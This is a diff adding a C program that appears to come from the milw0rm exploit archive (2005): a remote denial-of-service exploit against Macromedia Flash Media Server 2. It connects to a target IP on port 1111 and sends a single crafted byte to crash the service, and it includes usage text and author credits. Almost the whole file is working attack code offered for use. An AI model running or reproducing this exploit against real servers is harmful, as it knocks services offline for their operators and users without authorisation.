@@ -1,0 +1,88 @@
+/*****************************************************************
+
+Macromedia Flash Media Server 2 Remote D.o.S Exploit by Kozan
+
+Application: Macromedia Flash Media Server
+http://www.macromedia.com/software/flashmediaserver/
+Vendor: Macromedia
+
+Discovered by:  dr_insane
+Exploit Coded by: Kozan
+Credits to ATmaCA,  dr_insane
+Web: www.spyinstructors.com
+Mail: kozan@spyinstructors.com
+
+*****************************************************************/
+
+#include <winsock2.h>
+#include <stdio.h>
+#include <windows.h>
+
+#pragma comment(lib,"ws2_32.lib")
+
+int nDefaultPort = 1111;
+
+char SingleDoSChar[] = "\x41";
+
+int main(int argc, char *argv[])
+{
+       fprintf(stdout, "\n\nMacromedia Flash Media Server 2 Remote D.o.S Exploit by Kozan\n");
+       fprintf(stdout, "Bug Discovered by:  dr_insane\n");
+       fprintf(stdout, "Exploit Coded by: Kozan\n");
+       fprintf(stdout, "Credits to ATmaCA,  dr_insane\n");
+       fprintf(stdout, "www.spyinstructors.com - kozan@spyinstructors.com\n\n");
+
+       if(argc<2)
+       {
+               fprintf(stderr, "Usage: %s [Target IP]\n\n", argv[0]);
+               return -1;
+       }
+       WSADATA wsaData;
+       SOCKET sock;
+
+       if( WSAStartup(0x0101,&wsaData) < 0 )
+       {
+               fprintf(stderr, "Winsock error!\n");
+               return -1;
+       }
+
+       sock = socket(AF_INET,SOCK_STREAM,0);
+       if( sock == -1 )
+       {
+               fprintf(stderr, "Socket error!\n");
+               return -1;
+       }
+
+       struct sockaddr_in addr;
+
+       addr.sin_family = AF_INET;
+       addr.sin_port = htons(nDefaultPort);
+       addr.sin_addr.s_addr = inet_addr(argv[1]);
+       memset(&(addr.sin_zero), '\0', 8);
+
+       fprintf(stdout, "Please wait while connecting to server...\n");
+
+       if( connect( sock, (struct sockaddr*)&addr, sizeof(struct sockaddr) ) == -1 )
+       {
+               fprintf(stderr, "Connection failed!\n");
+               closesocket(sock);
+               return -1;
+       }
+
+       fprintf(stdout, "Please wait while sending single DoS char...\n");
+
+       if( send(sock,SingleDoSChar,lstrlen(SingleDoSChar),0) == -1 )
+       {
+               fprintf(stderr, "DoS char could not sent!\n");
+               closesocket(sock);
+               return -1;
+       }
+
+       fprintf(stdout, "Operation completed...\n");
+       closesocket(sock);
+       WSACleanup();
+
+       return 0;
+}
+
+// milw0rm.com [2005-12-14]
